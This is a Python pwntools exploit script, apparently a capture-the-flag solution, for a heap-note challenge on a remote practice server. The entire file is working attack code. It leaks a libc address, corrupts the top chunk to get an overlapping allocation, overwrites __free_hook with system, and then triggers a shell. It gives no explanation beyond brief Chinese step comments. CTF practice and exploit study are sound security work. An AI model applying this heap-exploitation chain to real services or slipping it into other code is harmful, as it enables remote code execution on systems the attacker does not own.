#coding:utf8
from pwn import *
 
# sh = process('./ACTF_2019_ACTFNOTE')
sh = remote('node3.buuoj.cn',29604)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
 
def add(size,name,content):
   sh.sendlineafter('$','1')
   sh.sendlineafter('size:',str(size))
   sh.sendafter('name:',name)
   sh.sendafter('content:',content)
 
def edit(index,content):
   sh.sendlineafter('$','2')
   sh.sendlineafter('id:',str(index))
   sh.sendafter('content:',content)
 
def delete(index):
   sh.sendlineafter('$','3')
   sh.sendlineafter('id:',str(index))
 
def show(index):
   sh.sendlineafter('$','4')
   sh.sendlineafter('id:',str(index))
 
add(0x10,'a\n','b'*0x18) #0
add(0x10,'a\n','/bin/sh\x00') #1
show(0)
sh.recvuntil('b'*0x18)
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - 0x8e3f2
system_addr = libc_base + libc.sym['system']
free_hook_addr = libc_base + libc.sym['__free_hook']
binsh_addr = libc_base + libc.search('/bin/sh').next()
print 'libc_base=',hex(libc_base)
print 'system_addr=',hex(system_addr)
add(0x10,'a\n','b\n') #2
edit(2,'b'*0x10 + p64(0) + '\xff'*0x8) #修改top chunk
#top chunk上移形成overlap chunk
add(-0x80,p64(free_hook_addr),'') #3
# gdb.attach(sh)
# #修改free_hook
edit(2,p64(system_addr))
#getshell
delete(1)
 
sh.interactive()